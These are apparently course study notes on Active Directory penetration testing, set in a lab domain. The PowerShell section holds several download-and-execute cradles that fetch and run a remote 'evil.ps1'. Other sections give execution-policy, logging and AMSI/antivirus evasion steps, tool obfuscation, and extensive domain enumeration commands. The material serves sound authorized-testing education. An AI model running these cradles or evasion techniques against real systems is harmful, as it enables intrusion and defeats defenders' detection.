---
icon: cherries
---

# PowerShell and .NET

## Active Directory Penetration Testing - PowerShell & .NET Tradecraft

### Table of Contents

* PowerShell Fundamentals
* PowerShell Security Bypasses
* AV Signature Bypasses
* Offensive .NET
* Domain Enumeration
* Active Directory Trusts

***

### PowerShell Fundamentals

#### Loading PowerShell Scripts and Modules

**Load a PowerShell script using dot sourcing:**

```powershell
. C:\AD\Tools\PowerView.ps1
```

**Import a module:**

```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

**List all commands in a module:**

```powershell
Get-Command -Module <modulename>
```

#### PowerShell Download-Execute Cradles

**Basic web client method:**

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

**Internet Explorer COM object method:**

```powershell
$ie = New-Object -ComObject InternetExplorer.Application;
$ie.visible = $False;
$ie.navigate('http://192.168.230.1/evil.ps1');
sleep 5;
$response = $ie.Document.body.innerHTML;
$ie.quit();
iex $response
```

**PowerShell v3+ method:**

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

**XMLHTTP method:**

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://192.168.230.1/evil.ps1',$false);
$h.send();
iex $h.responseText
```

**WebRequest method:**

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r  = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

***

### PowerShell Security Bypasses

#### Execution Policy Bypass

Execution Policy is **NOT** a security measure - it only prevents accidental script execution.

**Bypass methods:**

```powershell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

#### Invisi-Shell - Bypassing PowerShell Logging

**Tool:** https://github.com/OmerYa/Invisi-Shell

Invisi-Shell hooks .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging using the CLR Profiler API.

**Usage:**

*   **With admin privileges:**

    ```
    RunWithPathAsAdmin.bat
    ```
*   **With non-admin privileges:**

    ```
    RunWithRegistryNonAdmin.bat
    ```
* Type `exit` from the new PowerShell session to complete cleanup

***

### AV Signature Bypasses

#### Identifying Flagged Code

**Tools for detection:**

* AMSITrigger: https://github.com/RythmStick/AMSITrigger
* DefenderCheck: https://github.com/t3hbb/DefenderCheck

**Scan a script:**

```powershell
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
DefenderCheck.exe PowerUp.ps1
```

#### Bypass Process

1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat steps 2 & 3 until result shows **"AMSI\_RESULT\_NOT\_DETECTED"** or **"Blank"**

#### Script Modification Techniques

**Finding line numbers from byte offsets:**

* Use helper script to match byte offsets to line numbers
* Remove or obfuscate the detected portions
* Common culprits: Base64 encoded strings, specific function names

**Full obfuscation:**

* Use Invoke-Obfuscation: https://github.com/danielbohannon/Invoke-Obfuscation

***

### Offensive .NET

#### Introduction

* .NET lacks some security features present in System.Management.Automation.dll
* Many red teams have adopted .NET for offensive operations
* Numerous open-source offensive .NET tools available

#### Challenges with .NET Tradecraft

1. **Detection** by AV/EDR solutions
2. **Delivery** of compiled payloads
3. **Logging** (process creation, command line logging)

#### Source Code Obfuscation - Codecepticon

**Tool:** https://github.com/Accenture/Codecepticon

**Command example:**

```powershell
c:\AD\Tools\codecepticon.exe --action obfuscate --module csharp --verbose --path "c:\AD\Tools\Rubeus-master\Rubeus.sln" --map-file "c:\AD\Tools\Rubeus-master\Mapping.html" --profile rubeus --rename ncefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 --markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewrite-method xor
```

#### Binary Obfuscation - ConfuserEx

**Tool:** https://mkaring.github.io/ConfuserEx/

**Steps:**

1. Run ConfuserEx GUI
2. Add the Release folder of the compiled binary
3. Add a new Rule in the settings page
4. Double click the rule and set preset to "Maximum"
5. In the protect page, click "Protect" to produce obfuscated binary
6. Verify with DefenderCheck

***

### Domain Enumeration

#### Enumeration Tools

**ActiveDirectory PowerShell Module** (Microsoft signed, works in CLM):

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

**BloodHound** - Graph-based AD analysis:

* https://github.com/BloodHoundAD/BloodHound

**PowerView** - PowerShell enumeration:

```powershell
. C:\AD\Tools\PowerView.ps1
```

**SharpView** - C# version (no pipeline filtering):

* https://github.com/tevora-threat/SharpView/

#### Domain Information

**Get current domain:**

```powershell
# PowerView
Get-Domain

# ActiveDirectory Module
Get-ADDomain
```

**Get another domain:**

```powershell
# PowerView
Get-Domain -Domain moneycorp.local

# ActiveDirectory Module
Get-ADDomain -Identity moneycorp.local
```

**Get domain SID:**

```powershell
# PowerView
Get-DomainSID

# ActiveDirectory Module
(Get-ADDomain).DomainSID
```

#### Domain Policy Enumeration

**Get domain policy:**

```powershell
# PowerView - Current domain
Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess

# PowerView - Another domain
(Get-DomainPolicyData -domain moneycorp.local).systemaccess
```

#### Domain Controllers

**Get domain controllers:**

```powershell
# PowerView - Current domain
Get-DomainController

# PowerView - Another domain
Get-DomainController -Domain moneycorp.local

# ActiveDirectory Module - Current domain
Get-ADDomainController

# ActiveDirectory Module - Another domain
Get-ADDomainController -DomainName moneycorp.local -Discover
```

#### User Enumeration

**List all users:**

```powershell
# PowerView
Get-DomainUser
Get-DomainUser -Identity student1

# ActiveDirectory Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```

**Get specific user properties:**

```powershell
# PowerView
Get-DomainUser -Identity student1 -Properties *
Get-DomainUser -Properties samaccountname, logonCount

# ActiveDirectory Module - Discover properties
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name

# ActiveDirectory Module - Custom properties
Get-ADUser -Filter * -Properties * | select name, logoncount, @{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

**Search by attribute:**

```powershell
# PowerView
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description

# ActiveDirectory Module
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

#### Computer Enumeration

**List computers:**

```powershell
# PowerView
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping

# ActiveDirectory Module
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

#### Group Enumeration

**List all groups:**

```powershell
# PowerView
Get-DomainGroup | select Name
Get-DomainGroup -Domain <targetdomain>

# ActiveDirectory Module
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```

**Find groups with "admin":**

```powershell
# PowerView
Get-DomainGroup *admin*

# ActiveDirectory Module
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

**Get group members:**

```powershell
# PowerView - Domain Admins
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# ActiveDirectory Module
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

**Get user's group membership:**

```powershell
# PowerView
Get-DomainGroup -UserName "student1"

# ActiveDirectory Module
Get-ADPrincipalGroupMembership -Identity student1
```

#### Local Group Enumeration

**Note:** Requires administrator privileges on non-DC machines

**List local groups:**

```powershell
Get-NetLocalGroup -ComputerName dcorp-dc
```

**Get local group members:**

```powershell
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```

#### Logged On User Enumeration

**Get actively logged users** (requires local admin):

```powershell
Get-NetLoggedon -ComputerName dcorp-adminsrv
```

**Get locally logged users** (requires remote registry):

```powershell
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```

**Get last logged user** (requires admin rights and remote registry):

```powershell
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```

#### Share Enumeration

**PowerHuntShares** - https://github.com/NetSPI/PowerHuntShares

```powershell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

**PowerView share commands:**

```powershell
# Find shares
Invoke-ShareFinder -Verbose

# Find sensitive files
Invoke-FileFinder -Verbose

# Get fileservers
Get-NetFileserver
```

#### SOAPHound - Stealthy Enumeration

**Tool:** Uses Active Directory Web Services (ADWS - Port 9389) instead of LDAP queries

**Build cache:**

```powershell
SOAPHound.exe --buildcache -c c:\AD\Tools\cache.txt
```

**Collect BloodHound data:**

```powershell
SOAPHound.exe -c c:\AD\Tools\cache.txt --bhdump -o c:\AD\Tools\bloodhound-output --nolaps
```

#### BloodHound

**Versions:**

* BloodHound Legacy: https://github.com/BloodHoundAD/BloodHound
* BloodHound CE: https://github.com/SpecterOps/BloodHound

**Stealthy collection** (excludes noisy methods and DCs):

```powershell
C:\AD\Tools\Loader.exe --Path C:\AD\Tools\SharpHound\SharpHound.exe --args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs
```

**Full collection:**

```powershell
# BloodHound Legacy
C:\AD\Tools\Loader.exe --Path C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe --args --collectionmethods All

# BloodHound CE
C:\AD\Tools\Loader.exe --Path C:\AD\Tools\Sharphound\SharpHound.exe --args --collectionmethods All
```

#### ACL Enumeration

**Find interesting ACEs:**

```powershell
Find-InterestingDomainACL -ResolveGUIDs
```

**Get ACLs for specific objects:**

```powershell
# File path
Get-PathACL -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

# Domain object
Get-DomainObjectACL -SamAccountName student1 -ResolveGUIDs

# Specific search base
Get-DomainObjectACL -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
```

**ActiveDirectory Module:**

```powershell
(Get-ACL 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
```

#### GPO Enumeration

**List GPOs:**

```powershell
# PowerView
Get-DomainGPO
Get-DomainGPO -ComputerIdentity dcorp-student1

# Get GPOs with Restricted Groups
Get-DomainGPOLocalGroup
```

**GPO local group mapping:**

```powershell
# Get users in local groups via GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1

# Get machines where user has local group membership via GPO
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
```

#### OU Enumeration

**List OUs:**

```powershell
# PowerView
Get-DomainOU

# ActiveDirectory Module
Get-ADOrganizationalUnit -Filter * -Properties *
```

**Get GPO applied on OU:**

```powershell
# Get GPO name from gplink attribute
Get-DomainGPO -Identity "{OD1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
```

***

### Active Directory Trusts

#### Trust Fundamentals

**Trust Definition:** A relationship between domains/forests allowing users to access resources across boundaries.

**Trust Types:**

* **Automatic Trusts:** Created automatically (parent-child, tree-root)
* **Established Trusts:** Manually created (forest, external)

#### Trust Direction

**One-Way Trust:**

* Unidirectional access
* Direction: Trusting (resource) domain → Trusted (account) domain
* Users in trusted domain can access resources in trusting domain

**Two-Way Trust:**

* Bidirectional access
* Common in parent-child, tree-root, and forest trusts

#### Trust Transitivity

**Transitive Trust:**

* Can be extended to other domains in the forest
* All intra-forest trusts are transitive and two-way
* Example: If A trusts B and B trusts C, then A trusts C

**Non-Transitive Trust:**

* Cannot be extended to other domains
* Example: External trusts between different forests

#### Default/Automatic Trusts

**Parent-Child Trust:**

* Created automatically when new domain added under parent
* Always two-way transitive
* Example: `dollarcorp.moneycorp.local` is child of `moneycorp.local`

**Tree-Root Trust:**

* Created automatically when new domain tree added to forest root
* Always two-way transitive

#### External Trusts

* Between two domains in different forests
* Can be one-way or two-way
* Always non-transitive

#### Forest Trusts

* Trust relationship between two forests
* Allows all domains in one forest to trust all domains in another
* Enables cross-forest resource access

#### Trust Enumeration Commands

**Forest enumeration:**

```powershell
# Get current forest
Get-Forest
Get-ADForest

# Get all domains in forest
Get-ForestDomain
Get-ADForest | Select -ExpandProperty Domains

# Get global catalogs
Get-ForestGlobalCatalog
Get-ADForest | Select -ExpandProperty GlobalCatalogs

# Map forest trusts
Get-ForestTrust
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

**Domain trust enumeration:**

```powershell
# Get all domain trusts
Get-DomainTrust
Get-ADTrust

# For specific domain
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
```

#### Key Trust Concepts

* **Transitivity** is crucial for trust exploitation
* **External trusts** are non-transitive and often targeted for lateral movement
* **Parent-child and tree-root trusts** are automatic, transitive, and two-way
* **Trust enumeration** is critical for mapping attack paths in Active Directory

***

### Learning Objectives Summary

#### Learning Objective 1 - Basic Domain Enumeration

* Enumerate all users in dollarcorp domain
* Enumerate all computers in dollarcorp domain
* Identify Domain Administrators
* Identify Enterprise Administrators
* Use BloodHound to find shortest path to Domain Admins
* Find file shares with write permissions

#### Learning Objective 2 - ACL Analysis

* Enumerate ACL for Domain Admins group
* Identify ACLs where user has interesting permissions
* Analyze permissions in BloodHound UI

#### Learning Objective 3 - OU and GPO Analysis

* List all OUs
* List computers in specific OU (e.g., DevOps OU)
* List all GPOs
* Enumerate GPO applied on specific OU
* Enumerate ACLs for specific GPOs

***

_Note: These notes are for educational purposes in authorized penetration testing environments only._
